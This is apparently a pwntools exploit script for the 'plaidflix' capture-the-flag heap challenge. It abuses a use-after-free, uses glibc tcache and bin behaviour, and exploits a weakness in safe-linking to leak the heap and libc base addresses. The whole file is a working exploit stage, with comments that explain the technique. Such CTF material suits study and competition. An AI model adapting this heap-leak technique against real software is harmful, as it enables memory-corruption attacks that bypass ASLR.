from pwn import *
import re


class MenuNavigator:
    def __init__(self):
        self.p = process('./plaidflix')

    def read_prompt(self):
        menu_str = self.p.recvuntil('\n> ')
        self.menu = {}
        for line in menu_str.splitlines():
            if (m := re.search(b'^(\\d) - (.*)$', line)) is not None:
                self.menu[m.group(2)] = m.group(1)
        return menu_str

    def send_option(self, option):
        assert option in self.menu, self.menu
        self.p.sendline(self.menu[option])
        return self.read_prompt()

    def send_raw(self, s):
        self.p.sendline(s)
        return self.read_prompt()

    def add_friend(self, chunk_size):
        self.send_option(b'Manage friends')
        self.send_option(b'Add friend')
        self.send_raw(f'{chunk_size - 0x10 - 1}'.encode())
        self.send_raw(b'FRIEND')

    def remove_friend(self, idx):
        self.send_option(b'Manage friends')
        self.send_option(b'Remove friend')
        self.send_raw(f'{idx}'.encode())

    def add_movie(self):
        self.send_option(b'Manage movies')
        self.send_option(b'Add movie')
        self.send_raw(b'MOVIE')
        self.send_raw(b'5')

    def remove_movie(self, idx):
        self.send_option(b'Manage movies')
        self.send_option(b'Remove movie')
        self.send_raw(f'{idx}'.encode())

    def share_movie(self, movie_idx, friend_idx):
        self.send_option(b'Manage movies')
        self.send_option(b'Share movie with a friend')
        self.send_raw(f'{movie_idx}'.encode())
        self.send_raw(f'{friend_idx}'.encode())

    def show_movies(self):
        self.send_option(b'Manage movies')
        return self.send_option(b'Show movies')


MAX_FRIEND_COUNT = 8


def leak_addrs(mn):
    # Set up the heap leak: friend #0's chunk pointer (ch) ends up in a tcache bin.
    # Since there are no more chunks in the bin, ch->fwd == NULL.
    # However, the real value of ch->fwd in memory is not NULL, but
    # PROTECT_PTR(ch, NULL) == (ch >> 12) ^ NULL == ch >> 12.
    #
    # In other words, in this particular scenario, PROTECT_PTR() reveals
    # the heap pointer entirely instead of protecting it.
    mn.add_friend(0x40)
    mn.add_movie()
    mn.share_movie(0, 0)
    mn.remove_friend(0)

    # Set up the libc leak. First, allocate as many friend chunks as possible.
    # We want them to be large, so that they *don't* end up in a fast bin
    # when freed.
    for _ in range(MAX_FRIEND_COUNT):
        mn.add_friend(0x90)

    # In addition to leaking a libc pointer, this movie is a padding to prevent
    # the friend chunks from being consolidated with the top chunk when they
    # are freed.
    #
    # Therefore, it's important to allocate it *before* we start freeing friends.
    mn.add_movie()
    max_friend_idx = MAX_FRIEND_COUNT - 1
    mn.share_movie(1, max_friend_idx)

    # Free all friends. First 7 chunks end up in a tcache bin, but friend chunk #8
    # ends up in the unsorted bin. This means its fd and bk pointers point to
    # main_arena.bins[0] -- an address in libc.
    #
    # However, in Ubuntu 20.10, the first (little-endian) byte of this address
    # before ASLR is 0. Since ASLR is not applied to the first byte of the address,
    # it always remains 0, so the address can't be leaked with printf("%s", ...).
    for idx in range(MAX_FRIEND_COUNT):
        mn.remove_friend(idx)

    # To work around that, allocate a dummy friend chunk which is slightly
    # larger than what we used before. We don't care about what happens to
    # this larger dummy chunk. The only thing what matters is that glibc
    # tries to re-use the chunk that is stuck in the unsorted bin,
    # fails because the chunk is too small, and moves it to one of the small bins.
    #
    # To be precise, the moved chunk now points to main_arena.bins[16].
    # This is still an address in glibc, but a one that we can leak, since
    # its first (little-endian) byte is not 0.
    mn.add_friend(0xa0)

    leaks = []
    for line in mn.show_movies().splitlines():
        if (m := re.search(b'^\\* Shared with: (.*)$', line)) is not None:
            leaks.append(unpack(m.group(1), 'all'))
    return leaks


if __name__ == '__main__':
    mn = MenuNavigator()
    mn.read_prompt()
    mn.send_raw(b'dfyz')

    heap_leak, libc_leak = leak_addrs(mn)
    # heap_leak is the result of PROTECT_PTR(some_heap_addr, NULL),
    # which is exactly the randomized part of heap addresses.
    heap_base = heap_leak << 12
    # libc_leak is the address of one of the small bins from the main arena.
    libc_base = libc_leak - 0x1e3c80
    print(f'heap base: {heap_base:x}')
    print(f'glibc base: {libc_base:x}')
